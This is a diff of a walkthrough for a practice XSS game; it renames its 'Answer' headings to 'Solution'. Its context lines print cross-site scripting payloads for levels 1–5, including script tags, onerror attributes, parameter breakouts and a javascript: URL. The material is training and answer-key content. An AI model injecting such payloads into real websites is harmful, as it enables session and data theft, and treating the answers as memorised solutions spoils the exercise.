@@ -2,7 +2,7 @@
 
 ## Kevin Jackson
 
-### Level 1 Answer
+### Level 1 Solution
 
 Insert the following code into the text box and press enter:
 
@@ -10,7 +10,7 @@ Insert the following code into the text box and press enter:
 <script> alert('XSS') </script>
 ```
 
-### Level 2 Answer
+### Level 2 Solution
 
 Insert the following code into the message box and press enter:
 
@@ -18,14 +18,14 @@ Insert the following code into the message box and press enter:
 <img src="http://example.com" onerror="javascript:alert(1)"/>
 ```
 
-### Level 3 Answer
+### Level 3 Solution
 
 Insert the following code into the search bar and press enter:
 
 ```html
 https://xss-game.appspot.com/level3/frame#1' onerror='alert(1)';
 ```
-### Level 4 Answer
+### Level 4 Solution
 
 Insert the following code into the search bar and press enter:
 
@@ -33,7 +33,7 @@ Insert the following code into the search bar and press enter:
 https://xss-game.appspot.com/level4/frame?timer=')%3Balert(1)%3Bvar b=('
 ```
 
-### Level 5 Answer
+### Level 5 Solution
 
 Insert the following code into the search bar and press enter. After that press next:
 
@@ -42,7 +42,7 @@ https://xss-game.appspot.com/level5/frame/signup?next=javascript:alert("XSS")
 ```
 
 
-### Level 6 Answer
+### Level 6 Solution
 
 Insert the following code into the search bar and press enter:
 
